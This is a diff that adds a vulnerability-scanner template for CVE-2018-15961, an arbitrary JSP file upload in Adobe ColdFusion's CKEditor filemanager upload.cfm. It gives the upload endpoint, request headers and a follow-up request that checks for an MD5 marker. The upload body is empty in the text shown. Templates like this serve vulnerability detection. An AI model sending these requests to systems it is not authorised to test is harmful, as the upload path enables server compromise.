@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "通过 POST 请求向 /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm 上传包含 MD5 校验的 JSP 文件，然后访问上传后的文件路径验证响应中包含 ddbb3e76f92e78c445c8ecb392beb225 字符串，确认漏洞存在"
+id = "POC-AVE-2018-0408"
+name = "Adobe ColdFusion upload.cfm 任意文件上传漏洞 PoC"
+severity = "critical"
+tags = ["ave-2018-0408"]
+vuln_id = [
+    "CVE-2018-15961",
+    "AVE-2018-0408",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
+protocol = "http"
+
+[poc.requests.body]
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=---------------------------24464570528145"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["ddbb3e76f92e78c445c8ecb392beb225"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
